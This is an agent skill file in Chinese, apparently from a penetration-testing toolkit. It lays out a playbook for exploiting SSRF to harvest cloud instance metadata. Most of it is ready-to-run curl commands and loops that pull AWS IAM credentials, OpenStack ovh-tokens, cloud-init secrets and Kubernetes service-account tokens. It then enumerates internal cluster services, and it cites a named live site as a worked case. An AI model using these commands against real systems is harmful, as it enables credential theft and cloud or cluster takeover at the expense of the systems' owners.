---
name: 盗天·云骨
description: "有SSRF或云目标时枚举元数据拿云凭据. 触发: SSRF/169.254.169.254."
version: 1.0.0
license: MIT
platforms: [linux]
metadata:
    tags: [ssrf, cloud, metadata, openstack, aws, gcp, iam]
    category: ctf-pentest
---

> **盗天**
> 自身本是轮回客，踏遍万里寻归途！
> 盗亦有道留一线，手到偷来不问途。

# 云元数据收割 (Cloud Metadata Harvesting)

## 触发条件
- 已获得 SSRF (回显式最好) 且目标疑似云主机
- 目标是 OVH/Hetzner/AWS/GCP/Azure 等云上 SaaS / K8s 平台
- 需要从"任意 URL 请求"升级为"云凭据 + 集群接管"

## 第一步: SSRF 入口发现 (平台类目标)
交易/支付/SaaS 平台的**外部账号连接端点**是高频 SSRF 点:
- 特征: 添加交易所/银行/支付渠道账号, 提交 `base_url` / `path` / `api_url` / `webhook` / `rpc_url` 参数
- 本案例: `POST /api/accounts/extended?base_url=API&path=<完整URL>` — **path 接受完整 URL, 后端 python-httpx 直接请求并回显响应体** (回显式 SSRF!)
- 测试法: path 指向自己控制的 webhook (webhook.site 建 token 后可 API 拉取请求: `GET /token/<uuid>/requests`), 观察后端是否真实出网; 回显 200 + 目标内容 = 回显式
- 若无回显: 用 webhook.site 记录请求即可证明盲 SSRF, 再结合响应差异 (200/404/500) 做内网端口探测
- **注意**: "500 Internal Server Error" 在回显式 SSRF 里 = 目标连接失败/端口关闭 (不是目标响应!) — 用响应文本区分: 目标真实响应会带其内容 (Squid 400 页、nginx 404、JSON body)

## 第二步: 元数据端点 (按 provider)
| Provider | 端点 | 关键数据 |
|---|---|---|
| **OpenStack** (OVH/Hetzner/私有云) | `http://169.254.169.254/openstack/latest/meta_data.json` | **ovh-token**、K8s 集群 URL、node_ip、SSH 公钥、私网 CIDR |
| OpenStack user_data | `/openstack/latest/user_data`, `/openstack/latest/vendor_data.json` | cloud-init 配置 |
| **AWS EC2** (兼容端点常同时开) | `/latest/meta-data/`, `/latest/meta-data/iam/security-credentials/`, `/latest/user-data`, `/latest/meta-data/public-keys/0/openssh-key` | IAM 临时凭据、SSH key |
| **GCP** | `/computeMetadata/v1/...` **需要 `Metadata-Flavor: Google` 头** — 无头控制权的 SSRF 打不动 | SA token |
| Azure | `/metadata/instance?api-version=2021-02-01` (需 `Metadata: true` 头) | 管理凭据 |

**Provider 指纹** (不用头也能判断):
- `availability-zone: nova` / `AZ: nova` → **OpenStack** (OVH)
- instance-id `i-xxxxx` + `public-keys/` → EC2 兼容
- `/latest/meta-data/` 200 但 `/computeMetadata/v1/` 404 → OpenStack 的 EC2 兼容端点 (无需头!) — **GCP 路径 404 时立刻试 OpenStack/EC2 路径**
- 每个 SSRF 请求可能落到不同节点 (LB) → **多读几次 meta_data.json 收集多个节点 token/拓扑**

## 第三步: 凭据→集群升级
- ovh-token / IAM 凭据 → 云 API 控制面 (OVH API 需 consumer key 签名, 裸 token 通常 401 — 但 token 可能对集群内部服务有效)
- 元数据里的 `apiserver_url` + K8s 版本 → 试 apiserver 6443/8443 (常仅集群网络可达 — 从 SSRF 打, 注意 TLS: httpx verify 会挡自签 kubelet 10250)
- 内网网段 (meta_data 的 private_network_cidr) → 全内网端口扫描 (SSRF 慢扫, 500=关闭) — 用 `python3 炼蛊房/ssrf_probe.py` + Skill `定仙游·内借` 限流纪律（本库无此外门 `scripts/ssrf_internal_scan.py`）

## 第四步: K8s 内部服务 DNS 枚举 (svc.cluster.local)
SSRF 可达集群内 pod 时, **不扫端口, 直接猜 K8s Service DNS**:
- 格式: `http://<service>.<namespace>.svc.cluster.local:80/`
- 锚点: 已知 ArgoCD 时其 ns 必存在 (`argocd-server.argocd`); 再穷举派生组件: repo-server/dex/redis/applicationset-controller/notifications-controller/application-controller (各端口: server 80/8080, repo-server 8081, dex 5556/5557, applicationset-webhook 7000, notifications 9001)
- 常见 ns×服务名组合 (api/gateway/admin/backend/postgres/redis/minio/grafana/ingress-nginx/traefik/kong...): 200=直达, 404/400/308=存在, **500 = DNS 失败/连接失败 (不存在或隔离)**
- **外部 403/526 的 内部 vhost (adm/argocd/admin/staging) 从集群 DNS 往往全开** — ArgoCD 2.6.x 面板直达
- **限制**: POST-only+无 Content-Type 的 SSRF 打 grpc-gateway (ArgoCD /api/v1/*) 全 **415** (webhook 抓包证实转发请求无 CT) — 面板看得见吃不着, 记录等"可带 CT 的 SSRF"入口或登录凭据

## 陷阱
- GCP metadata 必须带 `Metadata-Flavor: Google` 头; 无头控制时改打 EC2 兼容路径
- kubelet 10250/10255、etcd 2379、SSH 22 在托管 K8s 通常全闭或 TLS 验证挡
- 内网探测限流: 应用层限流按用户/全局, **127.0.0.x loopback 轮换无效**, XFF 注入被 CF 层拦 (error 1000)
- 大规模内网扫描会触发全局限流 (banned ~45s 冷却) — 控制并发, 断点续扫

## 案例参考
- `references/origami-ssrf-case.md` — origami.tech 实战: accounts/extended SSRF → OpenStack metadata → ovh-token/K8s 集群/内网地图全链

## 真源

- 手法：`传承/定仙游·云骨.md`

---

## 快速命令集（SSRF → 元数据）

### OpenStack / OVH（最常见）

```bash
# 通过 SSRF 拉元数据（回显式，path 参数接受完整 URL）
curl -sk 'https://<目标>/api/accounts/extended' \
 -d 'base_url=http://169.254.169.254&path=http://169.254.169.254/openstack/latest/meta_data.json' \
 | python3 -m json.tool

# user_data（含 cloud-init 配置/密码/密钥）
curl -sk 'https://<目标>/api/accounts/extended' \
 -d 'path=http://169.254.169.254/openstack/latest/user_data'

# vendor_data（K8s 集群 URL/节点 IP）
curl -sk 'https://<目标>/api/accounts/extended' \
 -d 'path=http://169.254.169.254/openstack/latest/vendor_data.json'

# EC2 兼容路径（OpenStack 也支持，无需 Header）
curl -sk 'https://<目标>/api/accounts/extended' \
 -d 'path=http://169.254.169.254/latest/meta-data/iam/security-credentials/'
```

### AWS EC2

```bash
# IAM 角色名称（无需 Header，AWS IMDSv1）
SSRF_URL='http://169.254.169.254/latest/meta-data/iam/security-credentials/'
# 替换 SSRF 触发方式
curl -sk "https://<目标>/ssrf?url=$SSRF_URL"

# 拉取具体角色凭据（替换 <role_name>）
curl -sk "https://<目标>/ssrf?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/<role_name>"
# 返回: AccessKeyId / SecretAccessKey / Token / Expiration

# SSH 公钥（有时泄露 Key 名）
curl -sk "https://<目标>/ssrf?url=http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key"
```

### GCP（需 Header，SSRF 无法控制 Header 时打不动）

```bash
# 需要 Metadata-Flavor: Google 头
# 如果 SSRF 可控 Header（如 webhook/custom header 注入）：
curl -sk "https://<目标>/api/webhook?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" \
 -H 'X-Metadata-Header: Metadata-Flavor: Google'

# 替代：打 EC2 兼容路径（GCP 不支持，404 即说明是 GCP）
```

### K8s API Server（从元数据取到集群 URL 后）

```bash
# 通过 SSRF 打 apiserver（需 SSRF 可达集群内网）
APISERVER="https://<k8s-apiserver-ip>:6443"
curl -sk "$APISERVER/api/v1/namespaces" \
 -H "Authorization: Bearer <token-from-metadata>"

# ServiceAccount token（pod 内 SSRF 可用）
curl -sk "http://169.254.169.254/latest/meta-data/" | grep -i k8s
curl -sk "https://kubernetes.default.svc/api/v1/pods" \
 --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt \
 -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)"
```

### 内网服务 DNS 枚举（K8s cluster.local）

```bash
# ArgoCD 常见组件（通过 SSRF 枚举）
for svc in "argocd-server.argocd:80" "argocd-server.argocd:8080" "argocd-repo-server.argocd:8081"; do
 echo -n "Testing $svc: "
 # 替换为实际 SSRF 触发方式
 curl -sk -o /dev/null -w "%{http_code}" "https://<目标>/ssrf?url=http://$svc/"
 echo
done

# 常见 ns/服务组合
for item in "api.default:80" "backend.default:8080" "redis.default:6379" \
 "postgres.database:5432" "minio.minio:9000" "grafana.monitoring:3000"; do
 echo -n "Testing $item: "
 curl -sk -o /dev/null -w "%{http_code}" "https://<目标>/ssrf?url=http://$item/"
 echo
done
```

### SSRF 探针工具

```bash
# 使用内置 SSRF 探针
python3 炼蛊房/ssrf_probe.py \
 --target https://<授权站> \
 --ssrf-param path \
 --base-url http://169.254.169.254 \
 --case <案卷> \
 --out 案卷/<案卷>/ssrf/

# 内网端口扫描（限速，每次间隔 0.5s）
python3 炼蛊房/ssrf_probe.py \
 --target https://<授权站> \
 --ssrf-param url \
 --scan-internal 10.0.0.0/24 \
 --ports 80,443,8080,6379,27017,9200 \
 --rate-limit 2 --case <案卷>
```

### 证据写入

```bash
mkdir -p 案卷/<案卷>/ssrf/cloud/
# 保存元数据响应
curl -sk '...' > 案卷/<案卷>/ssrf/cloud/meta_data.json
# 提取 ovh-token（不要明文写入可能公开同步的文档）
python3 -c "
import json
data = json.load(open('案卷/<案卷>/ssrf/cloud/meta_data.json'))
print('Keys found:', list(data.keys()))
# token 脱敏后记录
"
```
